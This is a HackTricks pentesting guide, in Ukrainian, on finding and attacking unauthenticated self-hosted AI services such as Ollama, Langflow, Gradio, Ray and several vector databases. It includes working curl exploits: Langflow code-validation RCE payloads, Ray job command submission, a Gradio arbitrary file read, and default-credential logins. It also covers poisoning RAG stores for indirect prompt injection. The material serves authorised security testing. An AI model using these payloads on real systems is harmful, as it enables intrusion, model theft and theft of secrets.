# Відкриті self-hosted AI-сервіси

{{#include ../banners/hacktricks-training.md}}

Команди, які створюють AI-функції, часто запускають власні засоби виконання моделей, конструктори агентів, демонстраційні інтерфейси, обчислювальні кластери та векторні бази даних. Багато з цих інструментів призначені для ноутбука або ізольованої лабораторної мережі, тому **за замовчуванням не мають автентифікації** або постачаються з увімкненим спрощеним обходом автентифікації. Якщо такий сервіс доступний атакувальнику, наслідки зазвичай належать до однієї з таких категорій:

- Безкоштовне використання GPU та моделей, а також крадіжка приватних моделей.
- Витік промптів, документів та embeddings.
- Витік секретів із середовища процесу (ключів постачальників LLM, облікових даних хмарних сервісів).
- Виконання коду, оскільки деякі з цих API виконують код **як функцію**.

На цій сторінці описано, як знаходити ці сервіси та що перевіряти в кожному типі API. Щоб дізнатися, як посилити захист self-hosted inference-сервера та про витік llama.cpp `/slots`, див. [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Інформацію про шкідливі файли моделей наведено в [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Надсилайте ці запити без облікових даних. Відповідь JSON з очікуваними полями ідентифікує продукт і часто його версію, що допомагає визначити, які з наведених нижче перевірок застосовні. Це документовані порти за замовчуванням або порти з офіційних прикладів запуску.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Продукт | Типовий порт | Запит без автентифікації | Що його ідентифікує |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON із версією, список локальних моделей |
| Langflow | 7860 | `GET /api/v1/version` | JSON із версією Langflow |
| Gradio | 7860 | `GET /config` | Конфігурація застосунку з версією Gradio та ID компонентів |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, список надісланих завдань |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Значення heartbeat, версія Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Версія Qdrant, список колекцій |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Версія Weaviate, класи |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Список колекцій або помилка автентифікації |

Ці сервіси також часто публікуються за reverse proxy з префіксом шляху (наприклад, `/ollama/` або `/ray/`), тож повторюйте запити з усіма префіксами, знайденими в JavaScript-бандлах або документації API.

## API inference та керування моделями без автентифікації

Засоби виконання моделей зазвичай надають єдиний REST API, що поєднує маршрути inference з адміністративними маршрутами. Хороший приклад — Ollama. Вбудованої автентифікації в ній немає, а за замовчуванням вона прив’язується до `127.0.0.1:11434`; адресу прив’язки можна змінити за допомогою `OLLAMA_HOST`.<sup>[[1]](#references)[[15]](#references)</sup> В офіційному Docker-образі всередині контейнера встановлено `OLLAMA_HOST=0.0.0.0:11434`, оголошено `EXPOSE 11434` і немає інструкції `USER`, тому сервер у контейнері працює від імені root.<sup>[[16]](#references)</sup> `EXPOSE` не публікує порт на хості, тому доступність із хоста залежить від розгортання. У документованих командах `docker run` використовується `-p 11434:11434`, а Docker публікує таке зіставлення на всіх інтерфейсах хоста, якщо не вказано IP-адресу хоста.<sup>[[17]](#references)[[18]](#references)</sup>

Що кожна група маршрутів дає атакувальнику:<sup>[[2]](#references)</sup>

| Маршрути | Наслідки за відсутності автентифікації |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Список локальних і завантажених моделей, зокрема приватних кастомних моделей |
| `POST /api/show` | Відомості про модель, зокрема Modelfile, шаблон і **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Безкоштовний inference на апаратному забезпеченні жертви |
| `POST /api/pull`, `/api/push` | Завантаження моделлю зловмисно обраного реєстру на сервер або вивантаження туди моделі |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Створення, перезапис або видалення моделей |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Список моделей, повернений без облікових даних, уже доводить наявність exposure. У користувацьких моделей часто є внутрішній system prompt у `/api/show`. Pull на ваш хост доводить, що сервер отримує маніфести з вибраних атакувальником реєстрів. `/api/push` на ваш реєстр перетворює exposure на крадіжку моделей. Не викликайте маршрути create або delete на реальних цілях.

Pull із реєстру також створює attack surface для парсера, оскільки сервер зберігає blobs, використовуючи значення з віддаленого маніфесту. У Probllama (CVE-2024-37032, виправлено в Ollama 0.1.34) поле `digest` маніфесту використовувалося як ім’я файла без перевірки. Тому шкідливий реєстр міг записувати файли за межами каталогу blobs, використовуючи послідовності `../`. Надсилання маніфесту з digest, що вказував на локальний файл, спричинило leak цього файла до реєстру зловмисника. Wiz досягла RCE у Docker, де сервер працює від root, записавши спільну бібліотеку й додавши її до `/etc/ld.so.preload`, а потім викликавши `/api/chat`, щоб новий процес завантажив її.<sup>[[15]](#references)</sup> Якщо runner може завантажувати дані з довільних реєстрів, перевірте, як він перетворює поля маніфесту на шляхи.

## API, призначені для виконання коду

Пов’язане: [перевизначення коду workflow для кожного запиту у Flowise](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### API надсилання завдань

Фреймворки розподілених обчислень розглядають виконання коду як свою основну функцію. Ray Jobs API на порту dashboard (8265) приймає shell-команду `entrypoint` і запускає її в кластері.<sup>[[19]](#references)</sup> Дослідження Oligo ShadowRay повідомляє, що Jobs API не має авторизації, а dashboard прив’язується до `0.0.0.0`. Зв’язок із CVE-2023-48022 є спірним, оскільки Ray розрахований на роботу лише всередині контрольованої мережі.<sup>[[20]](#references)</sup> У версії 2.52.0 Ray додав необов’язкову автентифікацію за токеном (`RAY_AUTH_MODE=token`). Ray 2.59 вмикає її за замовчуванням для локальних кластерів, запущених через `ray.init()`; `ray start --head` без доступного токена все ще може запуститися без автентифікації. Ray документує ширше розгортання автентифікації за замовчуванням у версії 2.61, тому перевіряйте розгорнуту версію та режим запуску, а не припускайте, що dashboard відкритий.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Дашборди такого типу також мають допоміжні маршрути, які варто перевіряти у старих версіях. До Ray 2.8.1 маршрут `/log_proxy?url=` отримував будь-яку URL-адресу HTTP(S) (SSRF до метаданих хмари), а `/api/v0/logs/file` приймав довільний шлях `filename`; обидва працювали без автентифікації.<sup>[[8]](#references)</sup>

### Ендпоїнти «валідації» коду, які виконують визначення функцій

Конструктори агентів, що приймають власні компоненти Python, іноді «перевіряють» код, розбираючи його за допомогою `ast` і виконуючи лише визначення функцій через `exec()`. Це небезпечно. Python обчислює **декоратори та значення аргументів за замовчуванням під час визначення функції**, тому розміщений там код виконується, навіть якщо тіло функції ніколи не запускається. `POST /api/v1/validate/code` у Langflow працював саме так і не вимагав автентифікації до версії 1.3.0 (CVE-2025-3248). Якщо викликати виняток, що містить вивід команди, ендпоїнт поверне цей вивід у відповіді:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Перевірте на цю вразливість будь-який endpoint, який компілює, лінтує або «перевіряє» код користувача, і для підтвердження віддавайте перевагу DNS callback.

### Маршрути Auto-login і токенів суперкористувача за замовчуванням

Інструменти для одного користувача часто містять скорочений шлях, який входить у систему за кожного відвідувача як адміністратор. У Langflow, коли ввімкнено `AUTO_LOGIN`, `GET /api/v1/auto_login` повертає будь-якому запитувачу токени суперкористувача за замовчуванням. Коли ця опція вимкнена, маршрут відповідає `Auto login is disabled.`.<sup>[[23]](#references)</sup> У Langflow OSS версій від 1.0.0 до 1.10.0 вона була ввімкнена за замовчуванням (CVE-2026-9103). Поєднання цієї вразливості з описаним вище автентифікованим маршрутом перевірки коду знову дає змогу виконувати код віддалено без автентифікації (CVE-2026-9198, про яку повідомив Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> У поточних офіційних пакетах релізів і Docker-образах автоматичний вхід вимкнено, а для доступу потрібен пароль суперкористувача, але у гілках розробки він залишається ввімкненим.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Навіть без виконання коду токен superuser надає доступ до кожного flow і збережених облікових даних провайдерів. Пов’язану перевірку передумов для автоматизованого тестування див. у [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Маршрути обслуговування файлів і RPC у демонстраційних інтерфейсах ML

Фреймворки для демонстрації ML обслуговують завантажені й згенеровані файли через універсальний маршрут і дають фронтенду змогу викликати допоміжні функції серверних компонентів. Gradio надає для цього `/config`, `/upload` і `/file=<path>`.<sup>[[5]](#references)</sup> У будь-якому подібному фреймворку варто перевірити два сценарії:

- **Вихід за межі підкаталогу завантажень:** якщо маршрут файлів лише перевіряє, чи починається шлях у тимчасовій папці, завантажте файл, щоб створити підкаталог, а потім вийдіть із нього за допомогою `../` або `%2e%2e%2f`. Gradio версій від 4.0 до 4.10 (CVE-2023-51449) був уразливий до такого способу.<sup>[[26]](#references)[[27]](#references)</sup> Надсилайте запит за допомогою `curl --path-as-is`, щоб клієнт не нормалізував шлях.
- **Довільний виклик методів:** кінцева точка, що викликає `getattr(component, fn_name)` із користувацьким введенням, дає зловмиснику змогу викликати внутрішні допоміжні функції. До версії 4.13.0 так працював `/component_server` у Gradio. У версіях від 4.3 до 4.12 функція `move_resource_to_block_cache` копіювала будь-який локальний файл у кеш, звідки його можна було завантажити через `/file=`. У версіях від 3.47 до 3.50.2 інші допоміжні функції давали змогу читати файли та виконувати SSRF із повним читанням.<sup>[[26]](#references)[[28]](#references)</sup> Виправлений сервер відповідає `Function not found.` для допоміжних функцій, які не позначені як серверні.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

На Hugging Face Spaces секрети Space зберігаються як змінні середовища, тому `/proc/self/environ` — найцінніший файл. Horizon3 прочитали його за допомогою HTTP-заголовка `Range`.<sup>[[26]](#references)</sup>

## Векторні бази даних, які використовує RAG

RAG зберігає фрагменти оригінальних документів, їхні embeddings і метадані у векторній базі даних, а асистент додає найкращі результати до свого prompt. Тому доступ на читання призводить до витоку **відкритого тексту приватних документів**. Доступ на запис дає змогу зловмиснику вставляти фрагменти, які згодом додаються до prompt інших користувачів, що є стійкою непрямою prompt injection (див. [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Для векторних баз даних із власним хостингом перевірте, чи налаштована автентифікація або чи ввімкнено анонімний доступ:

- **Qdrant**: розгорнуті самостійно екземпляри прослуховують усі інтерфейси без автентифікації. Якщо налаштовано, ключ передається в заголовку `api-key` або як `Authorization: Bearer`. Можуть існувати ключі лише для читання та ключі для окремих колекцій.<sup>[[11]](#references)</sup>
- **Chroma**: автентифікацію типово вимкнено. Для автентифікації за токеном використовується `Authorization` або `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: запити без облікових даних автентифікуються як `user: anonymous`, якщо ввімкнено анонімний доступ, і отримують усі дозволи, надані цьому користувачу.<sup>[[30]](#references)</sup>
- **Milvus**: автентифікацію вимкнено, якщо для `common.security.authorizationEnabled` не встановлено значення `true`. Якщо її ввімкнено, пароль користувача `root` за замовчуванням — `Milvus`, а формат токена — `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Відповідь із приватними даними без облікових даних свідчить про витік. Якщо автентифікацію ввімкнено, окремо перевірте незмінений обліковий запис за замовчуванням:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Перевірте, чи містять payloads текст документів, ідентифікатори користувачів або назви tenant. Щоб продемонструвати доступ на запис, не забруднюючи production-дані, створіть і відразу видаліть порожню колекцію з чіткою назвою — і лише якщо це дозволено в межах scope.

На цих серверах автентифікація також може спрацьовувати запізно. У Python FastAPI-сервері Chroma (від версії 1.0.0 принаймні до 1.5.8, CVE-2026-45829) маршрут створення колекції створював передану клієнтом функцію embedding до перевірки автентифікації. Конфігурація, що посилалася на контрольовану зловмисником модель Hugging Face з параметром `trust_remote_code: true`, виконувала код зловмисника, навіть коли запит відхилявся. Rust frontend не був уразливим.<sup>[[32]](#references)</sup> Коли запит містить конфігурацію моделі чи плагіна, перевірте його без облікових даних і стежте за вихідним запитом до вашого репозиторію моделі.

## References

- [1] [Ollama: поширені запитання](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Документація API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Вихідний код Langflow — кінцеві точки API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Вихідний код Gradio — routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Вихідний код Gradio — http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Вихідний код Ray — job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox — Ray, версії 2.6.3 і 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Вихідний код Chroma — параметри клієнта за замовчуванням](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Вихідний код Chroma — маршрути FastAPI-сервера](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant — безпека](https://qdrant.tech/documentation/security/)
- [12] [Специфікація OpenAPI Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Специфікація OpenAPI Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus — підключення до сервера Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz — Probllama: уразливість віддаленого виконання коду в Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Документація Ollama щодо Docker](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker — публікація та відкриття портів](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API завдань Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo — ShadowRay: перша відома кампанія атак на AI-навантаження, що експлуатувала їх у реальних умовах](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Автентифікація за токеном у Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai — Небезпечно за будь-якої швидкості: зловживання Python Exec для неавтентифікованого RCE в Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Вихідний код Langflow — маршрутизатор входу](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD — CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD — CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai — експлуатація уразливостей читання файлів у Gradio для викрадення секретів із Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Рекомендація з безпеки Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Коміт із виправлення `/component_server` у Gradio](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Кулінарна книга Chroma — автентифікація Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate — автентифікація](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus — автентифікація користувачів](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer — ChromaToast: подано до автентифікації](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Бюлетень безпеки IBM — неавтентифіковане віддалене виконання коду через обхід автоматичного входу та перевірки коду (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
